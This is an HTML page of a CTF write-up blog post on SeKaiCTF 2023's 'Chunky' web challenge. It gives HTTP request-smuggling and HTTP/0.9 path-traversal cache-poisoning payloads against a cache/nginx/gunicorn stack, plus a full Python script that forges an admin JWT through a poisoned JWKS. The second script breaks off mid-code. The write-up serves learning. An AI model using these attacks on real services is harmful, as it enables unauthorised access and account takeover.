@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="ChunkyThe HTTP server in use is Gunicorn, version 20.1.0, which has known HRS issues as reported here. SummaryThe infrastructures include a web cache, a nginx proxy server, a gunicorn http server and">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SeKaiCTF 2023-Writeup">
+<meta property="og:url" content="https://blog.2h0ng.wiki/2023/08/27/SeKaiCTF-2023/index.html">
+<meta property="og:site_name" content="Zhong&#39;s Blog">
+<meta property="og:description" content="ChunkyThe HTTP server in use is Gunicorn, version 20.1.0, which has known HRS issues as reported here. SummaryThe infrastructures include a web cache, a nginx proxy server, a gunicorn http server and">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://api.2h0ng.wiki/noteimages/2024/01/21/18-10-39-82301c0270ea6c64b96b2f2de0690be4.png">
+<meta property="og:image" content="https://api.2h0ng.wiki/noteimages/2024/01/21/18-10-39-6b7bc474c7d9c1a6699772907b4da1df.png">
+<meta property="og:image" content="https://api.2h0ng.wiki/noteimages/2024/01/21/18-10-39-eef5239ef6d2d0d00478dd582b853d60.png">
+<meta property="og:image" content="https://api.2h0ng.wiki/noteimages/2024/01/21/18-10-39-0b2ca9c338d8ad07eb150f9645f8be9e.png">
+<meta property="article:published_time" content="2023-08-27T21:24:33.000Z">
+<meta property="article:modified_time" content="2024-01-21T23:32:27.120Z">
+<meta property="article:author" content="2h0ng, Zhong">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://api.2h0ng.wiki/noteimages/2024/01/21/18-10-39-82301c0270ea6c64b96b2f2de0690be4.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>SeKaiCTF 2023-Writeup</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-JRNNF9TMHE"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-JRNNF9TMHE');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/superboy-zjc">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/09/03/downunderctf-2023/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.2h0ng.wiki/2023/08/27/SeKaiCTF-2023/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.2h0ng.wiki/2023/08/27/SeKaiCTF-2023/&text=SeKaiCTF 2023-Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.2h0ng.wiki/2023/08/27/SeKaiCTF-2023/&title=SeKaiCTF 2023-Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.2h0ng.wiki/2023/08/27/SeKaiCTF-2023/&is_video=false&description=SeKaiCTF 2023-Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SeKaiCTF 2023-Writeup&body=Check out this article: https://blog.2h0ng.wiki/2023/08/27/SeKaiCTF-2023/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.2h0ng.wiki/2023/08/27/SeKaiCTF-2023/&title=SeKaiCTF 2023-Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.2h0ng.wiki/2023/08/27/SeKaiCTF-2023/&title=SeKaiCTF 2023-Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.2h0ng.wiki/2023/08/27/SeKaiCTF-2023/&title=SeKaiCTF 2023-Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.2h0ng.wiki/2023/08/27/SeKaiCTF-2023/&title=SeKaiCTF 2023-Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.2h0ng.wiki/2023/08/27/SeKaiCTF-2023/&name=SeKaiCTF 2023-Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.2h0ng.wiki/2023/08/27/SeKaiCTF-2023/&t=SeKaiCTF 2023-Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Chunky"><span class="toc-number">1.</span> <span class="toc-text">Chunky</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Summary"><span class="toc-number">1.1.</span> <span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation-guess"><span class="toc-number">1.2.</span> <span class="toc-text">Exploitation guess</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Writeup-1"><span class="toc-number">1.3.</span> <span class="toc-text">Writeup 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Writeup-2"><span class="toc-number">1.4.</span> <span class="toc-text">Writeup 2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Scanner-Service"><span class="toc-number">2.</span> <span class="toc-text">Scanner Service</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution-2"><span class="toc-number">2.1.</span> <span class="toc-text">Solution 2:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Golf-jail"><span class="toc-number">3.</span> <span class="toc-text">Golf-jail</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#leakless-note"><span class="toc-number">4.</span> <span class="toc-text">leakless note</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        SeKaiCTF 2023-Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">2h0ng, Zhong</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-08-27T21:24:33.000Z" class="dt-published" itemprop="datePublished">2023-08-27</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/ctf/" rel="tag">ctf</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Chunky"><a href="#Chunky" class="headerlink" title="Chunky"></a>Chunky</h1><p>The HTTP server in use is Gunicorn, version 20.1.0, which has known HRS issues as reported <a target="_blank" rel="noopener" href="https://grenfeldt.dev/2021/10/08/gunicorn-20.1.0-public-disclosure-of-request-smuggling/">here</a>.</p>
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>The infrastructures include a web cache, a nginx proxy server, a gunicorn http server and the Flask application. The order in which I’ve introduced these components also reflects the sequence in which a client request is processed.</p>
+<p><strong>For the web cache,</strong> the cache keys are http request method and request line. The request is forwarded to Nginx in its entirety, with a few exceptions.</p>
+<p>1、The request headers of “Transfer-Encoding”, “Expect” and “Forwarded” will be removed. However, this can be bypassed by altering the case of characters in these headers.</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// These are unsupported. Let&#x27;s ignore them.</span></span><br><span class="line">		headersToRemove := [<span class="number">5</span>]<span class="type">string</span>&#123;<span class="string">&quot;Transfer-Encoding&quot;</span>, <span class="string">&quot;Expect&quot;</span>, <span class="string">&quot;Forwarded&quot;</span>&#125;</span><br><span class="line">		<span class="keyword">for</span> _, h := <span class="keyword">range</span> headersToRemove &#123;</span><br><span class="line">			<span class="built_in">delete</span>(headers, h)</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2、The request body will only be sent to nginx according to the length of the Content-Length header. The web cache will ignore the http body if there is no Content-Length header.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">contentLength := headers[<span class="string">&quot;Content-Length&quot;</span>]</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> contentLength != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		length := 0</span><br><span class="line">		<span class="keyword">if</span> _, err := fmt.Sscanf(contentLength, <span class="string">&quot;%d&quot;</span>, &amp;length); err != nil &#123;</span><br><span class="line">			<span class="built_in">return</span> <span class="string">&quot;&quot;</span>, nil, fmt.Errorf(<span class="string">&quot;invalid Content-Length header: %s&quot;</span>, contentLength)</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		fmt.Printf(<span class="string">&quot;Body length: %d\n&quot;</span>, length)</span><br><span class="line"></span><br><span class="line">		body := make([]byte, length)</span><br><span class="line">		_, err := io.ReadFull(reader, body)</span><br><span class="line">		<span class="keyword">if</span> err != nil &#123;</span><br><span class="line">			<span class="built_in">return</span> <span class="string">&quot;&quot;</span>, nil, fmt.Errorf(<span class="string">&quot;error reading request body: %s&quot;</span>, err.Error())</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		_, err = serverWriter.Write(body)</span><br><span class="line">		<span class="keyword">if</span> err != nil &#123;</span><br><span class="line">			<span class="built_in">return</span> <span class="string">&quot;&quot;</span>, nil, fmt.Errorf(<span class="string">&quot;error sending request body: %s&quot;</span>, err.Error())</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>The Flask application</strong> is just a blog website. Users can sign up their account and post something on the blog. There is a possible way to exploit XSS at the blog template in which the array of post is controllable by users.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># post.html</span></span><br><span class="line"></span><br><span class="line">&#123;&#123; post[0] | safe &#125;&#125;&#123;&#123; post[1] &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Most important, <strong>the flag is served at the endpoint of ‘&#x2F;admin&#x2F;flag’.</strong> To get it, an effective JWT token is necessary. In the JWT verification process, the application first get users’ JWK from the fixed endpoint ‘&#x2F;{user_id}&#x2F;.well-known&#x2F;jwks.json’, and then use the JWK to verify the signature of users’ JWT. </p>
+<p>Our first step should be to replace our JWK with a controllable one, then sign the JWT with the private key we created. This process involves modifying the “user” value in the JWT to “admin”. Finally get the flag from the endpoint of <code>/admin/flag</code>.</p>
+<h2 id="Exploitation-guess"><a href="#Exploitation-guess" class="headerlink" title="Exploitation guess"></a>Exploitation guess</h2><p>To that point, we can combine HTTP request smuggling and  HTTP cache poisoning attacks to cache the &#x2F;{user_id}&#x2F;.well-known&#x2F;jwks.json’ with our self-crafted content.</p>
+<p>However, I encountered challenges in implementing HRS on the target. I tried all the exploitation methods on the <a target="_blank" rel="noopener" href="https://grenfeldt.dev/2021/10/08/gunicorn-20.1.0-public-disclosure-of-request-smuggling/">blog above</a>, but it didn’t work.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> -en <span class="string">&quot;GET /admin/flag HTTP/1.1\r\nHost: chunky.chals.sekai.team:8080\r\nDummy: x\nContent-Length: 28\r\n\r\nGET /admin HTTP/1.1\r\nDummy: GET / HTTP/1.1\r\nHost: localhost:8080\r\n\r\n&quot;</span> | nc chunky.chals.sekai.team 8080</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -en <span class="string">&quot;GET / HTTP/1.1\r\nHost: localhost:8080\r\nDummy: x\nContent-Length: 28\r\n\r\nGET /admin HTTP/1.1\r\nDummy: GET / HTTP/1.1\r\nHost: localhost:8080\r\n\r\n&quot;</span> | nc chunky.chals.sekai.team 8080</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Finally, find out how to solve this challenge.</p>
+<ul>
+<li>Approach 1: http 0.9 and file traversal</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /&#123;user_id&#125;/.well-known/jwks.json ../../../../&#123;user_id&#125;/&#123;post_id&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#Leveraging http/0.9 and file traversal. Do notice that the http response in HTTP 0.9 doesn&#x27;t have http response header. So you need to craft http response header in your payloads.</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Approach 2: CL.TE HRS <a target="_blank" rel="noopener" href="https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00">https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00</a></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /just_random_cache_key HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Length: 106</span><br><span class="line">transfer-encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /post/63d71c38-8aac-4463-84df-93973029c93c/210bef4b-c993-4cb2-a7b9-1769ed3af21b HTTP/1.1</span><br><span class="line">Dummy: GET /623d171c38-8aac-4463-84df-93973029c93c/.well-known/jwks.json HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">(a blank line here)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>To elaborate, the cache recognizes the end of the request body based solely on the Content-Length header, whereas Nginx and Gunicorn process the request body according to the Transfer-Encoding and disregard the Content-Length header, which leads to the rcache record two cache key <strong><code>GET /just_random_cache_key</code></strong> and <strong><code>/623d171c38-8aac-4463-84df-93973029c93c/.well-known/jwks.json</code>,</strong> while nginx and gunicorn see the second request as the uri <strong><code>/post/63d71c38-8aac-4463-84df-93973029c93c/210bef4b-c993-4cb2-a7b9-1769ed3af21b</code></strong> different from what the rcache saw. Finally, this kind of discrepancy leads to HTTP request smuggling.</p>
+<h2 id="Writeup-1"><a href="#Writeup-1" class="headerlink" title="Writeup 1"></a>Writeup 1</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">chunky without transfer-encoding chunked</span><br><span class="line">cache poisoning by path traversal</span><br><span class="line">GET /&#123;user_id&#125;/.well-known/jwks.json ../../../../&#123;user_id&#125;/&#123;post_id&#125;</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import pwn</span><br><span class="line">import os</span><br><span class="line">import subprocess</span><br><span class="line">import jwt</span><br><span class="line">import random</span><br><span class="line">import <span class="built_in">base64</span></span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;chunky.chals.sekai.team&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n-----Register random user and login-----\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">username = random.getrandbits(64)</span><br><span class="line"><span class="built_in">print</span>(f<span class="string">&#x27;Username: &#123;username&#125;&#x27;</span>)</span><br><span class="line">password = random.getrandbits(64)</span><br><span class="line"><span class="built_in">print</span>(f<span class="string">&#x27;Password: &#123;password&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">s.post(f<span class="string">&#x27;http://&#123;target&#125;:8080/signup&#x27;</span>, data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: password</span><br><span class="line">&#125;)</span><br><span class="line">s.post(f<span class="string">&#x27;http://&#123;target&#125;:8080/login&#x27;</span>, data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: password</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n-----Get user_id from session cookie-----\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">user_id = json.loads(base64.b64decode(s.cookies[<span class="string">&#x27;session&#x27;</span>].<span class="built_in">split</span>(<span class="string">&#x27;.&#x27;</span>)[0] + <span class="string">&#x27;===&#x27;</span>).decode())[<span class="string">&#x27;user_id&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(f<span class="string">&#x27;user_id: &#123;user_id&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n-----Generate JWT public and private key for JWKS-----\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://gist.github.com/ygotthilf/baa58da5c3dd1f69fae9</span></span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;rm -f key key.pub &amp;&amp; ssh-keygen -t rsa -b 4096 -m PEM -f key -q -N &#x27;&#x27; &amp;&amp; openssl rsa -in key -pubout -outform PEM -out key.pub&quot;</span>)</span><br><span class="line">x5c = subprocess.check_output(<span class="string">&quot;sed &#x27;1d; <span class="variable">$d</span>;&#x27; ./key.pub | tr -d &#x27;\n&#x27;&quot;</span>, shell=True).decode()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n-----Create post with fake HTTP response containing our JWKS-----\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">jwks_json = f<span class="string">&#x27;&#123;&#123;&quot;keys&quot;:[&#123;&#123;&quot;alg&quot;:&quot;RS256&quot;,&quot;x5c&quot;:[&quot;&#123;x5c&#125;&quot;]&#125;&#125;]&#125;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">r = s.post(f<span class="string">&#x27;http://&#123;target&#125;:8080/create_post&#x27;</span>, data = &#123;</span><br><span class="line">    <span class="string">&#x27;title&#x27;</span>: <span class="string">&#x27;HTTP/1.1 200 OK&#x27;</span> + <span class="string">&#x27;\r\n&#x27;</span> + f<span class="string">&#x27;Content-Length: &#123;len(jwks_json)&#125;&#x27;</span> + <span class="string">&#x27;\r\n\r\n&#x27;</span> + jwks_json,</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>: <span class="string">&#x27; &#x27;</span></span><br><span class="line">&#125;, allow_redirects=False)</span><br><span class="line"></span><br><span class="line">post_path = r.headers[<span class="string">&#x27;Location&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(f<span class="string">&#x27;Post created at &#123;post_path&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f<span class="string">&#x27;\n-----Cache poison /&#123;user_id&#125;/.well-known/jwks.json-----\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = pwn.remote(target, 8080)</span><br><span class="line">payload = f<span class="string">&#x27;GET /&#123;user_id&#125;/.well-known/jwks.json ../../../..&#123;post_path&#125;&#x27;</span></span><br><span class="line">r.send(payload.encode() + b<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">r.close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n-----Get flag-----\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">encoded = jwt.encode(&#123;<span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>&#125;, open(<span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).<span class="built_in">read</span>(), algorithm=<span class="string">&quot;RS256&quot;</span>)</span><br><span class="line"></span><br><span class="line">r = s.get(f<span class="string">&#x27;http://&#123;target&#125;:8080/admin/flag&#x27;</span>, headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Authorization&#x27;</span>: f<span class="string">&#x27;Bearer &#123;encoded&#125;&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Writeup-2"><a href="#Writeup-2" class="headerlink" title="Writeup 2"></a>Writeup 2</h2><p>chunked</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">url = <span class="string">&quot;http://localhost:8080&quot;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">s.get(url)</span><br><span class="line">user = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;somer1234cs&quot;</span> , <span class="string">&quot;password&quot;</span> : <span class="string">&quot;asdf123ed&quot;</span>&#125;</span><br><span class="line">s.post(url+<span class="string">&quot;/signup&quot;</span>,data = user)</span><br><span class="line">s.post(url+<span class="string">&quot;/login&quot;</span>,data=user)</span><br><span class="line"></span><br><span class="line">key = &#123;</span><br><span class="line">    <span class="string">&quot;keys&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;RS256&quot;</span>,</span><br><span class="line">            <span class="string">&quot;x5c&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCkuU6E051FayM7hJ4RPDE7ahZG\nm4UTbILFpLjd1r6OU3L9+mkgp+OyNc9OgMFCzxK4yuMw9UPZX/0CVPciVKzjVQ+n\naj3AQqU8/pStES3ffQ3dX5Gtl45pMtexVcWx6pjSdhWpoE98v4ZdGcmt28NXpbRH\neZQxam+j/6xgBPh/3wIDAQAB&quot;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line">payload = <span class="string">&#x27;HTTP/1.1 200 OK\nHost: localhost\n\r\n&#x27;</span>+json.dumps(key)</span><br><span class="line">post = &#123;<span class="string">&quot;title&quot;</span>: payload,<span class="string">&quot;content&quot;</span> : <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">r= s.post(url+<span class="string">&quot;/create_post&quot;</span>, data=post, allow_redirects=False)</span><br><span class="line">post = r.headers[<span class="string">&quot;location&quot;</span>]</span><br><span class="line">user_id = post.split(<span class="string">&#x27;/&#x27;</span>)[2]</span><br><span class="line"></span><br><span class="line">server_address = (<span class="string">&#x27;localhost&#x27;</span>, 8080)</span><br><span class="line"></span><br><span class="line">client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">client_socket.connect(server_address)</span><br><span class="line"></span><br><span class="line">smuggle = <span class="string">&quot;GET &#123;&#125;\r\nHost: localhost\r\n\r\n&quot;</span>.format(post)</span><br><span class="line"></span><br><span class="line">http_request = <span class="string">&quot;&quot;</span><span class="string">&quot;GET /post/asdf/f8badae4-0ff2-4fe8-ac15-3fc2d5b704c0 HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost</span></span><br><span 